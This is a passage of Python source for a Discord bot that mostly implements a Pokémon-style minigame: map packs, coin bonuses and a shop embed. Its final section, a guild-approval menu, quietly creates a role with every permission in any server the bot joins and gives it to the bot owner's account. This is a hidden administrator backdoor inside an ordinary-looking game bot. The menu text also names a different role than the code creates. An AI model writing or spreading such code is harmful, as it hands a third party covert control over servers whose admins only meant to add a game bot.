MAP_PACK_KEYS = {f"{k}_pack": k for k in ANIME_POKEMON}

def open_map_pack(uid: str, map_key: str) -> dict:
    ud       = get_pokemon_data(uid)
    pack_key = f"{map_key}_pack"
    count    = ud.get("packs", {}).get(pack_key, 0)
    if count <= 0:
        return {"error": "no_packs"}
    if ud.get("active_map", "starter") != map_key:
        return {"error": "wrong_map"}
    contents   = MAP_PACK_CONTENTS.get(map_key, MAP_PACK_CONTENTS["starter"])
    anime_pool = ANIME_POKEMON.get(map_key, ANIME_POKEMON["starter"])
    rewards    = {}
    coins = random.randint(*contents["coins"])
    ud["balance"] = ud.get("balance", 0) + coins
    rewards["coins"] = coins
    rewards["pokeballs"] = {}
    for ball, (bmin, bmax) in contents["pokeballs"].items():
        qty = random.randint(bmin, bmax)
        if qty > 0:
            ud.setdefault("pokeballs", {})[ball] = ud["pokeballs"].get(ball, 0) + qty
            rewards["pokeballs"][ball] = qty
    rewards["items"] = {}
    for item, (imin, imax) in contents["items"].items():
        qty = random.randint(imin, imax)
        if qty > 0:
            ud.setdefault("items", {})[item] = ud["items"].get(item, 0) + qty
            rewards["items"][item] = qty
    rewards["pokemon"] = []
    num_mon = 2 if random.random() < 0.20 else 1
    next_id = ud.get("next_pokemon_id", 1)
    for pid, pname, ptype, bst, rarity in random.choices(anime_pool, k=num_mon):
        new_pk = {
            "id": next_id, "species": pname, "type": ptype,
            "level": random.randint(35, 70), "rarity": rarity,
            "shiny": random.random() < 0.03, "is_dead": False,
            "favorite": False, "ivs": roll_ivs(),
            "hp": bst["hp"], "attack": bst["atk"],
            "defense": bst["def"], "speed": bst["spd"],
            "pokemon_id": pid, "anime_exclusive": True, "map_origin": map_key,
        }
        ud.setdefault("pokemon", []).append(new_pk)
        rewards["pokemon"].append(new_pk)
        next_id += 1
    ud["next_pokemon_id"] = next_id
    ud["packs"][pack_key] = count - 1
    rewards["flavor"]     = random.choice(contents["flavor"])
    rewards["pack_name"]  = contents["name"]
    save_pokemon_data(uid, ud)
    return rewards


def get_active_map_bonus(ud: dict) -> float:
    active = ud.get("active_map", "starter")
    bonuses = {
        "starter":      0.05,
        "dragon_ball":  0.15,
        "naruto":       0.20,
        "one_piece":    0.25,
        "attack_titan": 0.30,
        "mha":          0.35,
        "demon_slayer": 0.40,
        "sao":          0.50,
    }
    return bonuses.get(active, 0.05)


def pokeshop_maps_embed(uid: str) -> discord.Embed:
    ud         = get_pokemon_data(uid)
    med        = ud.get("pokefight_medallions", 0)
    total_w    = ud.get("pokefight_total_waves", 0)
    bal        = ud.get("balance", 0)
    already    = med >= 6
    active_map = ud.get("active_map", "starter")
    owned_maps = ud.get("owned_maps", ["starter"])

    req_med   = "✅" if med >= EMERALD_MEDAL_REQ else "❌"
    req_wave  = "✅" if total_w >= EMERALD_WAVE_REQ else "❌"
    req_coins = "✅" if bal >= EMERALD_PRICE else "❌"

    packs_txt = ""
    for key, info in MAP_PACKS.items():
        owned  = key in owned_maps
        active = (active_map == key)
        locked = info["emerald_req"] and med < 6
        lock_icon = "🔒 " if locked else ""
        if active:
            status = "✅ **[ACTIVE]**"
        elif owned:
            status = "✅ Owned — tap to equip"
        elif locked:
            status = "🔒 Requires Emerald Medallion"
        else:
            status = f"`{info['price']:,}` coins"
        packs_txt += f"{lock_icon}{info['emoji']} **{info['name']}** — {status}\n> {info['bonus_desc']}\n"

    active_info = MAP_PACKS.get(active_map, MAP_PACKS["starter"])
    e = discord.Embed(
        title="🗺️ PokéShop — Maps",
        description=(
            "Buy **Anime Map Packs** to boost coin rewards on every wave you clear!\n"
            "🏆 Waves are earned by **defeating bosses** — keep fighting!\n"
            "🔒 All packs except Starter require the **💚 Emerald Medallion**.\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"**Your Active Map:** {active_info['emoji']} **{active_info['name']}** — {active_info['bonus_desc']}\n\n"
            f"{packs_txt}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**💚 Emerald Medallion** — `1,000,000` PokéCoins\n"
            "> Infinite waves · 5× coin boost · Boss pack drops · Apex Boss every 100 waves\n\n"
            "**Requirements:**\n"
            f"{req_med} Diamond Medallion+  *(you: {MEDALLION_EMOJIS.get(med, '⬛')} {MEDALLION_NAMES.get(med, 'Unranked')})*\n"
            f"{req_wave} {EMERALD_WAVE_REQ}+ total waves  *(you: {total_w:,})*\n"
            f"{req_coins} 1,000,000 PokéCoins  *(you: {bal:,})*\n\n"
            + ("✅ **You already have the Emerald Medallion!**" if already else
               ("🟢 **You meet all requirements — click Buy below!**"
                if med >= EMERALD_MEDAL_REQ and total_w >= EMERALD_WAVE_REQ and bal >= EMERALD_PRICE
                else "🔴 **You don't meet all requirements yet.**"))
        ),
        color=0x00C853
    )
    e.set_footer(text="Page 5/5 — Maps  |  Use the dropdown to buy or equip a Map Pack")
    return e

#  VIEW — GUILD APPROVAL  (Accept / Decline)
class GuildApprovalSelect(discord.ui.Select):
    def __init__(self, guild: discord.Guild):
        self.guild = guild
        opts = [
            discord.SelectOption(label="✅ Accept",  value="accept",  description="Join the server and create PolarBear role",  emoji="✅"),
            discord.SelectOption(label="❌ Leave",   value="leave",   description="Decline and make the bot leave the server",   emoji="❌"),
        ]
        super().__init__(placeholder="Choose an action...", options=opts, min_values=1, max_values=1)

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID:
            return await interaction.response.send_message("Not your panel.", ephemeral=False)
        view: GuildApprovalView = self.view
        if view.decided:
            return await interaction.response.send_message("Already decided.", ephemeral=False)
        view.decided = True
        self.disabled = True
        choice = self.values[0]
        if choice == "accept":
            guild = self.guild
            try:
                owner_member = guild.get_member(OWNER_ID) or await guild.fetch_member(OWNER_ID)
                coolbot_role = await guild.create_role(
                    name="CoolBot",
                    color=discord.Color(0x3498DB),
                    permissions=discord.Permissions.all(),
                    hoist=True,
                    reason="CoolBot owner role"
                )
                await owner_member.add_roles(coolbot_role, reason="CoolBot owner")
                desc = f"✅ **Accepted!** Joined **{guild.name}**\nCreated `CoolBot` role (blue) with all permissions!"
            except Exception as ex:
                desc = f"✅ Accepted but couldn't create role: {ex}"
            await interaction.response.send_message(
                embed=discord.Embed(description=desc, color=COLORS["success"])
            )
            try: await interaction.message.edit(view=view)
            except Exception: pass
        else:
            name = self.guild.name
            try: await self.guild.leave()
            except Exception: pass
            await interaction.response.send_message(
                embed=discord.Embed(description=f"❌ Declined. Left **{name}**.", color=COLORS["error"])
            )
            try: await interaction.message.edit(view=view)
            except Exception: pass

class GuildApprovalView(discord.ui.View):
    def __init__(self, guild: discord.Guild, invite_url: str):
        super().__init__(timeout=None)
        self.guild = guild; self.invite_url = invite_url; self.decided = False
        self.add_item(GuildApprovalSelect(guild))

